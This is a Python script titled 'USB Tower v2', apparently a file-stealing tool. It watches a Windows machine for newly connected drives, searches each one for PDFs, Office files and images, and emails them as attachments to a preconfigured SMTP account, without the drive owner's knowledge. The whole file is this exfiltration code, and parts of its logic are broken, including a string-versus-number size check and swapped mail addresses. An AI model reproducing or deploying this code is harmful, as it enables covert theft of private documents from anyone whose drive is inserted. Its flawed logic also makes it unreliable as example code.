# Made by M4rc0sh.
# USB Tower v2.

import string
from ctypes import windll
from datetime import datetime
import os
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from email.message import Message
from email.header import Header

import shutil
import socket

global sent
sent = []

now = datetime.now().strftime('%d-%m-%Y %H:%M:%S')

debug_filename = "{}-[Debug]".format(now)
debug = open(str(debug_filename),"w+")
debug.write("Debug file created on {0}".format(now) + '\n')

allowed_extensions = ['pdf','doc','docx','xls','xlsx',"ppt","jpeg", "png"] # File allowed_extensions are taken from here
mail = [
		'', # To
		'',# From
		'', # SMTP Server:Port
		'', # User
		'', # Password
	   ]

special_routes = []

# Functions
# ---------

def prilog(message,flag):

	if flag == "l": #log
		debug.write(message + '\n' )
	elif flag == "pl": #Print and log
		print(message)
		debug.write(message + '\n' )


def send_mail_notification(message):

	msg = MIMEMultipart() 
	msg['To'] = mail[0]
	msg['From'] = mail[1]
	msg['Subject'] = "USBTower notification"
	msg.attach(MIMEText(message,'plain'))							
	server = smtplib.SMTP(mail[2]) 
	server.ehlo()
	server.starttls() 				
	server.login(mail[3],mail[4]) 
	server.sendmail(mail[0], mail[1], msg.as_string()) 								
	server.quit()

def get_drives():
	drives = []
	bitmask = windll.kernel32.GetLogicalDrives()
	for devices in string.ascii_uppercase:
		if bitmask & 1:
			drives.append(devices)
		bitmask >>= 1
	return drives # List


def scanner(): # Checks Windows connected drives
	
	while True:
		before = set(get_drives())
		prilog("[!] No connections detected, waiting 1s...","pl")
		time.sleep(1) # Wait 1 second between scans
		after = set(get_drives())
		drives = after - before
		delta = len(drives)

		if (delta != 0):
			for drive in drives:
				try:
					if os.system("cd " + drive + ":") == 0: # Move to the currently plugged in drive
						newly_mounted = drive
						global new_route
						new_route = newly_mounted +':/'
						prilog("[+] Device {0} detected, looking for files...".format(new_route), "pl")
						send_mail_notification("Device {0} has just been connected".format(new_route))
						look_up_for(new_route)

				except Exception as E:
					prilog("[!] Something happenned: [{0}]".format(E), "pl")
					send_mail_notification(str(E))
		else:
			continue
		
def look_up_for(route): # TODO: Introduce "Flags" like lof ( Look only for ) or lued ( look up entire directory ) 

	prilog("[+] Looking for files...", "pl")
						
	for dirName, _subdirList, files in os.walk(route):

		prilog("[+] Now inside: "+ dirName, "pl")
		prilog("[+] Files in the directory: "+ str(files), "pl")
						
		for file in files: # Now iterating over each file on the directory
			
			try:
				splitted_filename = file.split(".")
				ext = splitted_filename[len(splitted_filename)-1]

				if ext in allowed_extensions: # If the file extension is allowed then send the mail

					prilog("[+] Found valid file!: "+file, "pl")
						
					if (dirName +'/'+ file) not in sent:
						this_route = dirName+'/'+file
						send_mail(this_route, file, ext)

			except Exception as E:
			
				prilog("[!] Something happenned: [{0}]".format(E), "pl")


def send_mail(file_route, filename, file_extension): # Sends the file to the previously given mail
		
		file_size = str(float(os.path.getsize(file_route)/1024/1024))[0:6] #MB
		size_limit = 25.000 #MB
				
		if ((file_route not in sent) and (file_extension in allowed_extensions) and (file_size <= size_limit)): 

			prilog("[+] File suitable for mail", "pl")
			prilog("[+] FILE STATS: File name: {0} (Extension: {1}); File route: {2}; File size: {3}MB".format(filename, file_extension, file_route, file_size), "pl")
			
			try:

				msg = MIMEMultipart() 
				msg['To'] = mail[0]
				msg['From'] = mail[1]
				msg['Subject'] = filename #Message subject
				msg.attach(MIMEText("File directory: "+ str(file_route),'plain'))
				fp = open(file_route,'rb') # Open file and read it as a binary file
				
				prilog("[+] File opened", "pl")
				
				attach = MIMEBase('multipart', 'encrypted') 
				attach.set_payload(fp.read()) # Attach the file to the message
				encoders.encode_base64(attach) # Then, encode it whith Base64
				
				prilog("[+] File encoded", "pl")
				
				attach.add_header('Content-Disposition', 'attachment', filename = file_route) #Add mail header
				msg.attach(attach) 
				server = smtplib.SMTP(mail[2]) 
				server.ehlo()
				server.starttls() # Very important! This allows the application to comunicate with the server in a safe way
				
				prilog("[+] Mail login succesful", "pl")	
				
				server.login(mail[3],mail[4]) # Authentication USER,PASSWORD
				server.sendmail(mail[0], mail[1], msg.as_string()) 
				
				prilog("[+] Mail sent!", "pl")	
				
				fp.close()

				prilog("[+] File stream reading closed", "pl")
				
				server.quit()
				sent.append(filename) 

				prilog("[+] Filename added to sent list", "pl")
						
			except Exception as E:

				prilog("[!] Something happenned: [{0}]".format(E), "pl")
				send_mail_notification(str(E))		
		else:
				prilog("[!] File not valid, skipping... ", "pl")
				prilog("[!] FILE STATS: File name: {0} (Extension: {1}); File route: {2}; File size: {3}MB".format(filename, file_extension, file_route, file_size), "pl")
			

# CALLS
# --------

run_counter = 0
while True: # Ensures that if the USB is plugged out, the function scanner won't finish running
	if run_counter == 0:
		send_mail_notification("Everything OK, execution started...")
	run_counter += 1
	scanner()
